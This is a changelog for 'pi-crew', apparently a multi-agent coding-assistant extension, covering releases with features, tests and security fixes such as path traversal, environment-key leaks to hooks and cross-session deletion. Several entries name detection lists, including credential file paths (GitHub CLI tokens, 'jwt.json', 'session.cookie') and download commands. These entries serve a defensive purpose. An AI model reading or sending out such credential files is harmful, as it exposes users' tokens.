- `clearCache()` / `getCacheStats()` — cache management

#### P6: Agent Checkpointing
- `FileCheckpointStore` — checkpoints in `.crew/state/runs/<runId>/checkpoints/`
- `saveCheckpoint()` / `loadCheckpoint()` / `clearCheckpoint()`
- `hasCheckpoint()` / `listCheckpoints()` for recovery

### Tests
- 56 new unit tests (all passing)
- Total: 1796 unit tests + 45 integration tests passing

### Bug Fixes
- Worktree test teardown: clean `.crew/` before git checks for clean repository

---

## [0.4.0] — 9arm-skills Enforcement Patterns & Integration Tests (2026-05-26)

### Features
- **systematic-debugging: Refuse Gate** — Hard constraints before proposing fixes. Must verify repro exists, root cause known, and hypothesis falsified before any fix.
- **systematic-debugging: Recite Ritual** — Psychological anchor at session start. Recite 4-step mantra before beginning any debug session.
- **systematic-debugging: Falsify-First** — Phase 3 now requires disproof before proof. Run disproof experiments first to save time on wrong hypotheses.
- **systematic-debugging: Breadcrumb Ledger** — Structured experiment tracking within debug sessions.
- **multi-perspective-review: Simpler Alternative Pass** — Mandatory pre-review step to question if the change should exist at all.
- **New skill: scrutinize** — Outsider-perspective review questioning intent before tracing code.
- **New skill: post-mortem** — Engineering RCA documentation with 4 required inputs gate.
- **skills/REFERENCE.md** — New documentation of skill chains, inventory, and anti-patterns.
- **Trigger conditions** added to all major skill descriptions for better skill invocation matching.

### Bug Fixes
- **CI reliability** — Fixed flaky tests on macOS: crew-widget and render-scheduler timing issues resolved.
- **Team-context import detection** — Fixed regex to correctly match only direct `/team-tool.ts` imports, not `/team-tool/context.ts`.

### Tests
- **New test-integration-check.ts** — Integration tests for core pi-crew functionality (agent/team/workflow discovery, fast-fix team run).
- **1740 tests passing** across all platforms (Ubuntu, macOS, Windows).

---

## [0.3.8] — Zombie Run Auto-Repair & Test Stability (2026-05-25)

### Features
- **Periodic auto-repair timer** — `autoRepairIntervalMs` in `CrewReliabilityConfig` (default 60s, 0 to disable) calls `reconcileAllStaleRuns` via `configureObservability`. Timer uses `.unref()` to avoid blocking Node exit; cleaned up on session shutdown.
- **`wait` action** — New `team action='wait'` polls a running team until completion. Accepts `runId` (required), `config.timeoutMs` (default 300 000 ms), and `config.pollIntervalMs` (default 2 000 ms). Returns run status, summary, and per-task statuses. Resolves via `waitForRun` in `run-tracker.ts`.

### Bug Fixes
- **No-PID zombie run repair** — Runs without async PID (e.g. live-session /tmp workspaces) previously waited 24h for repair. Now `stale-reconciler` checks if ALL running tasks have heartbeats stale >5min (`NO_PID_HEARTBEAT_STALE_MS`) and repairs immediately.
- **Orphaned /tmp workspace cleanup** — `reconcileOrphanedTempWorkspaces()` scans `/tmp/pi-crew-*` for stale `running` manifests and auto-cancels them. Runs every 5min alongside per-CWD reconciliation.
- **Live-session test hang at depth > 0** — `runtime-policy.ts` now skips child-process override when `PI_CREW_MOCK_LIVE_SESSION='success'`, preventing tests from spawning real pi processes that hung indefinitely.

### Tests
- New `test/unit/auto-repair-timer.test.ts` (5 test cases for zombie reconciliation).
- New `test/fixtures/test-tempdir.ts` — tracks temp dirs with `test.after()` cleanup.
- Updated `live-session-context.test.ts` and `live-session-runtime.test.ts` to use tracked temp dirs and `PI_CREW_DEPTH=0`.
- Updated `stale-reconciler.test.ts` for new reconciliation paths.

## [0.3.0] — Phase 3a+3b: Discovery Cache, Dynamic Agent Registry, Rich TUI Rendering (2026-05-23)

### Phase 3a: Agent Discovery Cache
- **500ms TTL cache** with max 32 entries and per-cwd invalidation
- **FIFO eviction** when cache is full
- Cache pruned on every `discoverAgents()` call
- `invalidateAgentDiscoveryCache(cwd?)` exposed for explicit invalidation

### Phase 3b: Dynamic Agent Registry
- **`registerDynamicAgent(config)`** — runtime agent registration with cache invalidation
- **`unregisterDynamicAgent(name)`** — throws on missing agent
- **`listDynamicAgents()`** — returns all registered dynamic agents
- Dynamic agents get **highest priority** over discovered agents (security: project < builtin < user < dynamic)
- **CrewRegistry v2** — extended from v1 with `registerAgent`/`unregisterAgent`/`listDynamicAgents`
- Factory `installCrewGlobalRegistry()` for clean initialization

### Rich TUI Tool Rendering
- **New `src/ui/tool-render.ts`** (304 lines) — shared rendering module ported from pi-subagent4
- **`renderTeamToolCall`** — collapsed: `team action='run' (default) "goal preview"` / expanded: header + goal streaming
- **`renderAgentToolCall`** — collapsed: `Agent explorer "prompt preview"` / expanded: header + prompt
- **`renderTeamToolResult`** — `[status] goal text` for run actions / compact info for others
- **`renderAgentToolResult`** — status icons (⟳○✓✗) + output lines for agent results
- **`renderAgentProgress`** — icon + header + tool log + context gauge + usage line (↑↓RW$ctx)
- Helpers: `formatTokens`, `formatDuration`, `formatContextUsage`, `truncLine`, `formatToolPreview`
- All tools use **`@mariozechner/pi-tui`** Components (Container, Text, Spacer) directly
- `renderCall`/`renderResult` added to: `team`, `Agent` tools

### Tests
- **1662 tests pass** (1652 unit + 46 integration + 4 new)
- New test suites: `agent-discovery-cache.test.ts` (10 tests), `tool-render.test.ts` (10 tests)
- Bug fix: `allAgents` priority corrected (discovery: project < builtin < user; dynamic separate/highest)

## [0.2.21] — 3 Bugs Fixed — Background Runner, Child-pi stdin, Phantom Runs (2026-05-22)

## [0.2.25] — CI Fixes & needs_attention Terminal Status (2026-05-22)

### Bug Fixes
- **needs_attention as valid terminal status** — DAG scheduler now treats `needs_attention` as terminal (like `completed`). This fixes infinite retry loops when tasks complete without calling `submit_result`.
- **TypeScript compilation errors** — Fixed duplicate `loadRunManifestById` imports and added missing `persistSingleTaskUpdate` import in `live-executor.ts`.
- **Test assertions updated** — 6 test files now accept `needs_attention` as valid terminal status for mock tests.
- **LAZY markers for dynamic imports** — Added proper `// LAZY:` comments for `check-lazy-imports` script compliance.
- **Memory limit flag handling** — Updated `async-runner.test.ts` to handle `--max-old-space-size=512` in command args.

### Tests
- All 1655 tests pass (1609 unit + 46 integration).
- CI passes on all 3 platforms (ubuntu/macos/windows).

## 0.2.20 — 14 Bugs Fixed — needs_attention, Heartbeat, OOM, API Keys (2026-05-20)

### Features

- **needs_attention terminal task status** — Tasks that complete without calling `submit_result` now get `activityState: needs_attention` instead of `completed`. Workflow phases advance on either `completed` or `needs_attention`.
- **3-layer OOM protection for background runs** — `node --max-old-space-size=512` prevents Node OOM kills; heartbeat + `pid_dead` stale detection catches zombie workers; `SIGTERM`/`SIGINT`/`SIGUSR2` handlers log `async.failed` for diagnosis.
- **Essential env vars preserved for child processes** — `PATH`, `HOME`, `USER`, `LANG`, `LC_ALL` now passed to child Pi workers.
- **Model API key allow-list** — `MINIMAX_API_KEY` and other model keys are preserved in child process env.
- **Async notifier stale-ctx guard** — `isCurrent` flag prevents stale session notifications from corrupting active run state.

### Bug Fixes

- **Bug #1/2: 429 → stale heartbeat misclassification** — MiniMax `provider_error` with 429 status retried with fallback chain.
- **Bug #3: background.log silent on error** — Captures all stderr/exit output.
- **Bug #4: worker-startup.ts missing rate_limited** — `error.classification = "rate_limited"` added.
- **Bug #5: stale notifications after prune** — Heartbeat checked before declaring `pid_dead`.
- **Bug #6: concurrent tool calls cancel foreground runs** — Confirmed as design constraint.
- **Bug #7: async notifier stale-ctx dies** — `isCurrent` guard added.
- **Bug #8/10: MINIMAX_API_KEY filtered** — Added to env allow-list.
- **Bug #9: executor yield limit → needs_attention** — `noYield` path sets `activityState: needs_attention`.
- **Bug #11: background spawn ENOENT** — `resolveScriptPath` handles `node_modules` hoisting.
- **Bug #12: essential env stripped** — `PATH/HOME/USER/LANG/LC_ALL` preserved.
- **Bug #13: background runner dies at ~59s** — 3-layer OOM protection.
- **Bug #14: infinite retry loop** — `needs_attention` gets `queue: "done"` in task graph scheduler.

### Tests

- Added `test/unit/needs-attention-status.test.ts` (9 cases for contracts, transitions, agent-control idle detection).

## 0.2.3 — Bug Fixes & Hardening (2026-05-12)

### Security

- **[MEDIUM] Event log append concurrency** — `appendFileSync` on Windows is not atomic; concurrent parent + background-runner writes could interleave JSONL lines. Fix: cross-process `withEventLogLockSync` using atomic `mkdirSync` + stale-lock detection via owner PID.
- **[MEDIUM] Subagent path traversal** — `persistedSubagentPath(cwd, id)` did not validate `id` before joining into a file path. Fix: `isValidSubagentId` regex guard (`^[a-z0-9_]+$`, max 128 chars).
- **[LOW] PEM redaction unbounded scan** — `PEM_PRIVATE_KEY_PATTERN` used `\s\S]*?` without length limit, causing full-file scan on truncated input. Fix: capped to 65,536 characters.
- **[LOW] Sleep utility `require()` in ESM** — `sleep.ts` used `require("node:child_process")` inside an ES module. Fix: top-level ESM `import { execFileSync }`.

### Correctness

- **Async lock fail-fast** — `acquireLockWithRetryAsync` previously waited the full deadline (~60 s) when an active (non-stale) lock existed. Fix: throw immediately, matching sync behavior.
- **Atomic-write sync parity** — Async `atomicWriteFileAsync` had a "matches" fallback (read existing, compare content) for race conditions; sync path lacked it. Fix: added identical fallback to sync.
- **Sequence cache leak** — `sequenceCache` was an unbounded Map. Fix: `MAX_SEQUENCE_CACHE_ENTRIES = 256` with oldest-entry eviction.
- **Iteration hooks / post-checks env inconsistency** — `runSetupHook` used `sanitizeEnvSecrets(..., { allowList })` but `runIterationHook` and `runPostCheck` used hard-coded env whitelists. Fix: unified all three to `sanitizeEnvSecrets` with the same allow-list (includes Windows vars: `USERPROFILE`, `TEMP`, `ComSpec`, `SystemRoot`).
- **Worktree error parsing locale-dependent** — `git worktree add` error messages parsed with English regexes but `git()` helper did not force locale. Fix: `LANG: "C"`, `LC_ALL: "C"` injected into all `git()` calls in `worktree-manager.ts` and `cleanup.ts`.
- **Event log lock stale-detect** — `withEventLogLockSync` previously had no stale-lock recovery and always `rmdirSync`ed in `finally` even when lock was never acquired. Fix: PID-based stale detection + conditional cleanup only on `acquired=true`.

### Portability

- **Windows `.cmd/.bat` spawn safety** — Node ≥ 20 CVE-2024-27980 blocks direct `.cmd/.bat` spawn. Fix: `.cmd`/`.bat` scripts on Windows now run via `cmd.exe /d /s /c scriptPath`.
- **Git Bash fallback on Windows** — `resolveShellForScript` now prefers Git Bash (`bash.exe` from `Git\bin`) when available, falling back to PowerShell/cmd only when absent.
- **Jiti loader resolution for hoisted installs** — `resolveJitiRegisterPath` used hard-coded `../../` candidates that failed when pi-crew was installed via local path or in a hoisted monorepo. Fix: ancestor walk upward from `packageRoot` plus fallback candidates `register.mjs` and `dist/register.mjs`.

### Tests

- Added `test/unit/worktree-manager.test.ts` (branch recovery, reuse, clean leader, file node_modules skip).
- Added `test/unit/artifact-store.test.ts` (hash integrity, path traversal, nested dirs).
- Added `test/unit/locks-race.test.ts` tests (stale lock recovery sync+async, active lock fail-fast).
- Added `test/unit/redaction-transcript-roundtrip.test.ts`.
- Added `test/unit/env-filter.test.ts` and `test/unit/resolve-shell.test.ts`.
- Added `scripts/check-lazy-imports.mjs` with `npm run check:lazy-imports` CI gate.

---

## 0.2.0 — Security & Performance Hardening

### Performance

- **Extension registration: 72% faster** — Lazy-loaded the entire runtime chain (team-tool, team-runner, runtime-resolver, etc.) from `register.ts`. Pi cold-start: 3,200ms → 780ms.
- **Commands UI: 65% faster** — Lazy-loaded RunDashboard (288ms), DurableTextViewer (658ms), and 5 overlay components that were statically imported but only used on demand.
- **Verifier: 80% faster** — 6-turn budget enforced at runtime via `maxTurns` agent config. Run-once + cache strategy (tee to `.crew/cache/`) eliminates repeated 3-minute test suite runs. Typical verifier runtime: 40+ min → ~8 min.
- **Transcript viewer: lazy-loaded** — DurableTranscriptViewer (658ms) only loaded when user runs `/crew transcript`.

### Security

- **[HIGH] Path traversal in `handleImport`** — Bundle paths were accepted without containment validation. Arbitrary file read was possible via absolute paths. Fix: `isContained` check validates paths stay within `cwd`, `userCrewRoot`, or `projectCrewRoot`.
- **[HIGH] Env variable leak in hooks** — Iteration hooks and post-checks passed the full `process.env` to user bash scripts, exposing API keys and tokens. Fix: minimal env with only `PATH`, `HOME`, `USER`, `LANG`.
- **[HIGH] Ownership check on `handleForget`** — The most destructive action (recursive `fs.rmSync`) had no session ownership guard. Any Pi session could delete any other session's run data. Fix: `foreignRun` guard matching `handleCancel`/`handleRetry`.
- **[MEDIUM] TOCTOU on Windows `O_NOFOLLOW=0`** — On Windows where `O_NOFOLLOW` is unsupported (0), a symlink race between validation and write was possible. Fix: post-open `fstat`/`fstatSync` verification in both sync and async atomic-write paths.
- **[MEDIUM] Ownership check on `handleCleanup`** — Worktree cleanup had no cross-session guard. Any session could clean up another session's worktrees. Fix: `foreignRun` guard added.
- **[MEDIUM] `handleForget` scope detection** — Used `startsWith(userCrewRoot())` which could false-match `pi-crew-evil` against `pi-crew`. Fix: `startsWith(userCrewRoot() + path.sep)`.
- **[MEDIUM] `isSafeToPrune` always used `projectCrewRoot`** — User-scoped runs could never be pruned, causing stale data accumulation. Fix: same scope detection as `handleForget`.
- **[MEDIUM] `readJsonFile` swallowed all errors silently** — Permission denied, corrupt JSON, and other errors were silently swallowed, preventing crash recovery. Fix: `logInternalError` for non-ENOENT/ENOTDIR errors.
- **[LOW] TOCTOU in `atomic-write mkdirSync`** — Between `isSymlinkSafePath` check and `mkdirSync`, an attacker could replace a directory with a symlink. Mitigated by `O_EXCL` on subsequent file open.
- **[LOW] `handlePrune` cross-session behavior documented** — Pruning all finished runs regardless of session is intentional maintenance behavior, now documented.
- **[INFO] `handleExport` intentionally cross-session** — Read-only export deliberately allows cross-session access, documented with comment.


### Correctness

- **Ghost run accumulation** — 73 deadletter runs were stuck as `queued` forever because their temp CWD directories had been cleaned by the OS. Fix: `collectRuns` now filters by CWD existence, `pruneUserLevelRuns` auto-cleans ghost runs.
- **Double-close file descriptor in `readTailLines`** — Giant-line fallback was calling `closeSync(fd)` then falling through to `finally { closeSync(fd) }` (double close). Fix: sentinel `GiantLineFallbackError` class caught in outer `catch`.
- **Race condition in lazy-load caches** — `ui()` and `handleTeamTool()` in `commands.ts` could trigger redundant parallel imports if multiple `/crew` commands fired before cache populated. Fix: promise-deduplication pattern (`_uiCachePromise` / `_handleTeamToolPromise`).
- **`handlePrune` hook only fired for first run** — Batch pruning fired `before_cleanup` hook for only the first run. Fix: fires once with `removedRunIds` in data payload.
- **`maxTurns` parsing accepted invalid values** — `parseInt("0")` → `0` (falsy → `undefined`) was accidental; `parseInt("-1")` → `-1` (truthy → passed through). Fix: explicit `Number.isFinite(n) && n > 0` check in both parsing and runtime override.
- **`GiantLineFallbackError` sentinel string** — Using a magic string for control flow was fragile. Fix: dedicated error class.
- **Tail reader UTF-8 corruption** — Reading from middle of file could split a multibyte character at the boundary. Fix: search for first newline boundary before reading.
- **Tail reader empty result on giant line** — Single line >256KB with no newlines: `lines.shift()` removed ALL content. Fix: fallback to full file read when no newline found in tail chunk, with 2MB safety cap.
- **Stale JSDoc in hooks** — Security notes still said "full inherited environment" after minimal env change. Fix: updated to "minimal environment (PATH, HOME, USER, LANG)".
- **`readJsonFile` redundant `existsSync` check** — TOCTOU guard was redundant since `catch` handles ENOENT anyway. Fix: removed redundant check.

### Architecture

- **`maxTurns` agent frontmatter** — New `maxTurns` field in `AgentConfig` (parsed from `agents/*.md` frontmatter) enforces per-agent turn limits at runtime. Verifier uses `maxTurns: 6` for efficiency.
- **Verifier efficiency contract** — Complete rewrite of `agents/verifier.md`: 6-turn budget, run-once-cache strategy, targeted verification only, PASS/FAIL with evidence format.
- **Sensitive path detection expanded** — Added `.config/gh` (GitHub CLI tokens), `jwt.json`, `session.cookie`, `.token` to detection patterns.
- **Manifest goal sanitization** — `manifest.goal` in compaction summaries now collapsed (newlines → spaces) and truncated (500 chars) to prevent markdown injection.
- **`utils/atomic-write.ts` dead code removed** — This module had zero production imports; tests were testing the wrong (unsafe) version. Deleted; tests rewritten against `src/state/atomic-write.ts`.
- **Test coverage** — 17 new tests: `atomic-write.test.ts` (9 tests), `compaction-summary.test.ts` (8 tests, all pass).

### Research (not in package)

- `docs/research/CAVEMAN-DEEP-RESEARCH.md` — Caveman output contract patterns, role-based compression, verification framework.
- `docs/research/LIVE-SESSION-PRODUCTION-READY-PLAN.md` — 9-phase plan for live-session reliability, all phases implemented.

### Contributors

- 6 rounds of structured code review across 3 sessions
- 30+ issues found and fixed (0 CRITICAL remaining, 0 HIGH remaining)


## 0.1.51

### Fixed

- **Stale foreground spinner** — Working message/spinner now always clears when foreground run completes, even if session generation changed during the run.
- **Completed-run widget grace period (8s)** — Runs that just completed stay visible in the widget for 8 seconds so users can see results before the widget hides.

## 0.1.50

### Fixed

- **Parallel execution** — Raised default concurrency (implementation 2→4, review 2→3, research 2→3). Fixed `defaultWorkflowConcurrency()` routing bug where review/default both returned the implementation value.
- **Planner prompt** — Added explicit "MAXIMIZE PARALLELISM" instruction with examples, so planner models produce parallel phases instead of sequential.
- **20 review findings** — 6 CRITICAL (optional chaining crash, env leak, path redaction, RPC validation, hook JSON safety, temp dir security), 6 HIGH (unsafe casts, busy-wait CPU, timestamp merge guard, prompt injection delimiter, binary validation), 5 MEDIUM, 3 LOW.
- **Widget flicker** — Pinned preloaded manifests to widget component model to prevent manifestCache TTL race. Scoped snapshotCache invalidation to specific run instead of clearing all.
- **Delegation policy** — Rewritten as mandatory decision table with concrete thresholds (>3 files read or >2 files edit = must delegate). Injected into every session via system prompt.
- **ignoreMethod option** — New config to write ignore entries to `.git/info/exclude` instead of `.gitignore` (Closes #2).

## 0.1.49

### Added

- **Caveman output contracts** — Role-based output validation framework with `output-validator.ts`: regex-based format checking for explorer, executor, reviewer, verifier, security-reviewer roles. Non-blocking: validation failures emit `task.output_validation` events + set `needs_attention` but do NOT fail the task.
- **Prose compressor** — `prose-compressor.ts` compresses verbose worker output for token-sensitive contexts (role-aware compression levels).
- **Sensitive paths** — Word-boundary-aware token matching in `sensitive-paths.ts` prevents false positives (e.g. `secretary.ts` no longer flagged as `secret`).
- **Symlink-safe I/O** — Artifact and shared output paths reject traversal attempts and symlinked root escapes.
- **Output contract eval harness** — 19 unit tests covering three-arm evaluation (contract vs terse vs baseline), format compliance, token savings, regex safety (no `/g` lastIndex state leak).

### Changed

- **Delegation policy rewritten** — Replaced advisory "you should consider" text with a mandatory decision table: concrete thresholds (>3 files read OR >2 files edit = MUST delegate), explicit YES/NO cases per task type, conflict-safe task splitting rules. Injected into every session via `before_agent_start` hook.
- **Powerbar dedup** — `powerbar-publisher.ts` now skips `powerbar:update` emit when segment data is unchanged (inspired by pi-powerbar's `segmentEquals` pattern). Combined with existing 200ms coalescing for minimal unnecessary renders.
- **UI responsiveness** — `task-runner.ts` now emits `streamBridge` event immediately after `task.started`, giving the widget agent status within ~100ms instead of 2-5s (child process startup delay).
- **"spawning…" indicator** — Widget shows "spawning…" for agents < 5 seconds old with no tool activity, distinguishing from "thinking…" for long-running agents.

### Fixed

- **H1: MCP proxy fallback** — `mcp-proxy.ts` now falls back to `enableMcp: true` when `createMcpProxyTools()` returns empty, so child sessions self-discover MCP instead of losing all access.
- **H2: parallel-utils throw undefined** — `mapConcurrent` now throws the actual error instead of `throw undefined`.
- **H3: Semaphore over-release** — `release()` guard against `#current > 0` prevents over-release corruption.
- **M1: IRC tool TOCTOU** — `irc-tool.ts` wraps `sendIrcMessage`/`broadcastIrcMessage` in try-catch.
- **M2: submit-result ordering** — Builds response string before calling `onYield`, wrapped in try-catch.
- **M3: Sensitive paths false positives** — Word-boundary-aware token matching replaces substring matching.
- **M4: atomic-write sleepSync** — Added WARNING comment about blocking main thread.
- **M7: URL regex trailing punctuation** — Precise regex excludes trailing punctuation from URL matches.
- **L1: parent-guard comment** — Corrected misleading comment about `process.kill` on Windows.
- **Yield handler DRY** — Extracted `extractYieldDataFromArgs` helper, `isObjectRecord`/`isStringRecord` type guards, safe `find()` pattern.
- **Event-log-rotation TOCTOU** — `compactEventLog` re-reads file after initial read to merge concurrent appends; `readEvents` skips corrupt JSON lines.
- **Ghost agent dedup** — Fixed duplicate agent records in `crew-agent-records` after crash recovery.

### Research

- `docs/research/AGENT-EXECUTION-ARCHITECTURE.md` — Detailed comparison of 3 execution modes (oh-my-pi in-process, pi-crew child-process, pi-crew live-session).
- `docs/research/UI-RESPONSIVENESS-AUDIT.md` — Root cause analysis for 2-5s agent spawn visibility delay, 5 proposed fixes with priority matrix.
- `docs/research/DEEP-RESEARCH-PI-POWERBAR.md` — Deep analysis of pi-powerbar architecture (producer/consumer pattern, rendering, settings, comparison with pi-crew's powerbar publisher).

## 0.1.48

### Added

- **Yield-based completion contract** — Workers can call `submit_result` tool to return structured results; task-runner warns on workers that don't yield.
- **Typed event channels** — `RunEventBus` supports 5 channels (`worker:progress`, `worker:lifecycle`, `worker:stream`, `run:state`, `ui:invalidate`) with `onChannel`/`onChannelForRun` subscriptions and auto-classification.
- **Human-readable task names** — `generateTaskName()` produces AdjectiveNoun names (14,400 combinations); `displayName` field on `TeamTaskState`.
- **SubprocessToolRegistry** — Extensible tool event handling with `register`/`extractAll`/`shouldTerminate` pattern; wired into event-stream-bridge.
- **Event log rotation/compaction** — Auto-compacts event logs over 5MB/50k events, keeping last 1000 events; atomic file replacement.
- **Incremental JSONL reader** — `readLinesSince`/`readJsonlSince` for seek-based file reading; wired into `readEventsCursor` with `fromByteOffset`.

### Fixed

- Fixed `readBlob`/`readBlobMetadata` crash on missing files — now returns `undefined`.
- Fixed `readSseJson` crash on non-JSON SSE data — now skips malformed events.
- Fixed wrong value `"long_running"` → `"active_long_running"` in agent-control.
- Fixed `consecutiveFailures` type bypass — added to `CrewAgentProgress` interface.
- Fixed `streamBridge.dispose()` memory leak — now in try/finally.
- Fixed blob-store redundant ternary `typeof x === "string" ? x : x`.
- Fixed team-runner non-null assertion on potentially empty array.
- Fixed event-log silent error swallowing — now logs via `logInternalError`.
- Fixed team-tool switch case indentation.
- Removed dead code `expandIcon` in agent-management-overlay.

### Changed

- Moved 6 research .md files from repo root to `docs/research/`.
- `discoverAgents`/`discoverSkills` silent catches now log via `logInternalError`.
- `executeHook` accumulates non-blocking diagnostics instead of short-circuiting.
- `CancellationToken.heartbeat` wired into `collectRuns` and `pruneFinishedRuns`.
- `CapabilitySource` extended with `"git"` to match `ResourceSource`.

## 0.1.47

### Added

- **Typed hook lifecycle** — 8 of 9 hooks wired: `before_run_start`, `before_task_start`, `task_result`, `before_cancel`, `before_forget`, `before_cleanup`, `before_publish`, `run_recovery`. Hooks are opt-in, blocking/non-blocking, with audit events.
- **Event-first UI bus** — `RunEventBus` emits on every `appendEvent` call; dashboard, crew widget, sidebar, and snapshot cache subscribe for event-driven invalidation instead of polling.
- **Shared scan cache** — `SharedScanCache` caches manifest reads and active-run entries with TTL, mtime/size invalidation, and LRU eviction.
- **Capability inventory** — `buildCapabilityInventory()` enumerates teams, workflows, agents, and skills with stable `kind:name` IDs; supports policy disable and shadowing detection.
- **Skills in capability inventory** — `discoverSkills()` reads SKILL.md frontmatter; skills appear with kind=`skill` and source=`package`/`project`.
- **Mailbox kind-separated breakdown** — `RunUiMailbox` tracks `steerUnread`/`followUpUnread`/`responseUnread`/`messageUnread`; mailbox pane shows urgency indicators.
- **Run recovery hook** — `applyRecoveryPlan` fires `run_recovery` hook; blocked recovery emits `crew.run.recovery_blocked` event.
- **Synthetic tool cancellation evidence** — Cancelled in-flight tasks receive `tool`-level terminal evidence alongside `worker`-level.
- **CancellationToken wired into production loops** — `collectRuns` and `pruneFinishedRuns` use `CancellationToken.heartbeat(stage)` for progress diagnostics.
- **Blob artifact store** — SHA-256 content-addressed storage with metadata sidecars.
- **Run event provenance** — Event metadata includes `parentEventId`, `attemptId`, `branchId`, `causationId`, `correlationId`.
- **Control channel reservation** — `ControlReservation` before worker spawn with deterministic `controllerId`.
- **Release smoke test** — `npm run smoke:release` automates tarball install + version consistency check.
- **Width-safety tests** — Crew widget rendering verified at widths 1/40/200/empty/multiple.

### Changed

- `handleCancel`, `handleForget`, `handleCleanup`, `handlePrune`, `handleExport` converted to async for hook execution.
- `before_cancel`/`before_forget`/`before_cleanup` hooks can block their respective operations.
- `before_publish` hook fires before run export.
- `task_result` hook fires before `task.completed`/`task.failed` events.
- Dashboard, widget, and sidebar auto-invalidate on `RunEventBus` events.

## 0.1.45

### Added

- Added `/team-respond <runId> <taskId|--all> <message>` for replying to interactive/waiting tasks from slash commands.
- Added runtime-extensible run ownership metadata (`ownerSessionId`) so destructive cancellation can be guarded by session ownership.
- Added async manifest and crew-agent readers used by snapshot preloading.

### Fixed

- Fixed `respond` action to validate waiting-only tasks, write replies to task mailboxes, and reject non-waiting task responses instead of reporting false success.
- Fixed `cancel` ownership handling so runs created by another Pi session are not cancelled when `ownerSessionId` mismatches.
- Fixed `DeliveryCoordinator` to requeue payloads when active delivery callbacks throw, and to drop queued payloads from stale session generations.
- Fixed `OverflowRecoveryTracker` collisions by keying recovery state with `runId + taskId`, plus cleanup of terminal recovery states.
- Fixed stale reconciliation false positives for foreground/live no-PID runs by preserving runs with recent task heartbeat or agent progress evidence.
- Fixed UI waiting counts: snapshots, powerbar, and crew widget now include `waiting` tasks/agents where appropriate.
- Fixed team tool `cwd` override handling so valid overrides are applied consistently and invalid overrides return a clear error.
- Fixed session history pollution by only appending `crew:run-started` after a successful run with a real `runId`.
- Fixed async snapshot preload path to avoid synchronous manifest/agent reads.
- Fixed mailbox count semantics for large mailbox files by marking tail-derived counts as approximate when the file is larger than the bounded tail window.
- Fixed auto-retry freshness by reloading manifest/tasks before retry attempts and fallback task runs.

### Changed

- Wired session snapshots into `session_before_switch` logging so active runs and pending deliveries are captured before session transitions.
- Dashboard mailbox pane now indicates when counts are approximate tail-derived values.

## 0.1.43

### Added

- `/team-settings` command: view and manage all pi-crew config from Pi CLI (`list`, `get`, `set`, `unset`, `path`, `scope`).
- `addTranslations(locale, bundle)` and `listLocales()` for runtime-extensible i18n.

### Fixed

- **UI freeze crash**: replaced `setInterval` with recursive `setTimeout` in `RenderScheduler` and `HeartbeatWatcher` to prevent timer storms when renders exceed the interval.
- **Growing-file I/O bottleneck**: `safeRecentEvents`, `readMailboxCounts`, `readGroupJoinMailbox` now use tail-reading (last 32 KB) instead of reading entire `.jsonl` files that grow unbounded over long runs.
- **Snapshot cache TTL** increased from 250 ms to 500 ms, halving unnecessary I/O.
- **Heartbeat watcher memory leak**: stale keys are now cleaned after 10 minutes of inactivity instead of being held forever.
- **Dashboard crash guard**: `render()` is wrapped in `try/catch` with a fallback error display.
- **Dashboard selected-index mismatch**: reset `selected` to 0 when the selected run disappears from the manifest cache.
- **`live-run-sidebar.ts` crash**: fixed missing optional chaining on `agent.progress?.recentOutput?.at(-1)`.
- **`signatureFor` crash**: `JSON.stringify` in snapshot cache wrapped in `try/catch` with a timestamp fallback.
- **Render scheduler timer leak**: added a `disposed` guard after `schedule()` to prevent orphaned timers.
- **Render scheduler loop guard**: capped at 5 iterations per `flush()` to prevent infinite loops when `render()` re-enters `flush()`.
- **`powerbar-publisher.ts`**: replaced `.filter().length` with `.reduce()` counting to avoid temporary array allocations.

### Changed

- **i18n module hardened**: locale validated at runtime (not hardcoded union type), `currentLocale` reset on dispose, missing-key guard (`fallback[key] ?? key`), `__test__resetI18n()` helper.

## 0.1.42

### Fixed

- Reduced atomic-write rename retries from 20 to 5 and added busy-wait fallback for `Atomics.wait` to avoid event-loop stalls on Windows with aggressive file-locking.
- Applied the same `sleepSync` fallback pattern to `locks.ts` for consistent lock-acquisition resilience.
- Removed dead `findReadyTask` function in team-runner.
- Eliminated a redundant `refreshTaskGraphQueues` O(n) call per batch iteration by reusing the already-computed `taskGraphSnapshot` for ready-task selection.
- Expanded `appendTaskAttentionEvent` dedup window from 100 to 200 events and switched to a computed dedup key.

### Changed

- Extended `MUTATING_TOOLS` set in completion guard with `replace_in_file`, `insert`, `delete_files`, `create_file`, `overwrite`, and `patch`.
- Extended `MUTATING_COMMANDS` regex with `sed -i`, `tee`, `wget -O`, and `curl -o` patterns.
- Reordered bash-command mutation check so mutating patterns (`sed -i`) take priority over read-only patterns (`sed`).
- Unknown bash commands that don't match the read-only list are now treated as potentially mutating (conservative default).

### Hardened

- Replaced `timer.unref?.()` with `timer.unref()` in `SubagentManager` blocked-poll and stuck-notify timers.
- Added session-liveness guard to `notifyOperator` fallback so it won't attempt `sendFollowUp` after extension cleanup.

## 0.1.41

### Added

- Added strict-provider-friendly team tool schema shapes and config schema coverage for result delivery controls.
- Added resilient result watcher fallback polling for resource-limit watch failures and partial JSON retry handling.
- Added `runtime.completionMutationGuard` (`off`/`warn`/`fail`) with structured `task.attention` events when implementation-style workers complete without observed mutations.
- Added group-join mailbox delivery metadata, request-id dedupe, ack observability, timeout events, and dashboard/status visibility.
- Expanded `team doctor` and `team status` with schema, async/result delivery, worktree/readiness, attention, transcript, and group-join diagnostics.

### Fixed

- Recovered adaptive implementation planner output when compaction truncates the end marker but complete phase objects are still present.

## 0.1.40

### Added

- Added owner-session generation guards for background subagents, async run notifications, result watchers, and live-session callbacks so stale sessions do not receive completions.
- Added `runtime.requirePlanApproval` with approve/cancel API support to gate mutating adaptive implementation tasks behind an explicit planner artifact approval.
- Added shared secret redaction for event logs, mailbox persistence, artifacts, JSONL streams, agent records, notifications, metrics, and diagnostics.

### Changed

- Project-local agents, teams, and workflows can no longer shadow builtin or user resources with the same name.
- Project-level sensitive config such as worker execution, runtime mode, autonomy, agent overrides, worktree setup hooks, and OTLP headers is ignored with warnings unless configured in trusted user scope.

### Fixed

- Fixed lost async completion notifications after auto-compaction/session restart by continuing to track active runs across notifier restarts.
- Fixed stale background subagent wakeups after session switch/shutdown while preserving terminal results for explicit joins.
- Fixed resume bypasses in plan approval by re-gating persisted mutating adaptive tasks when approval state is missing or pending.
- Restricted plan approval and cancellation to non-read-only roles and rejected cancel/approve after the approval state is no longer pending.

## 0.1.39

### Fixed

- Made CI test execution deterministic across Node 22/macOS/Linux/Windows by running Node test files sequentially to avoid cross-file environment races.
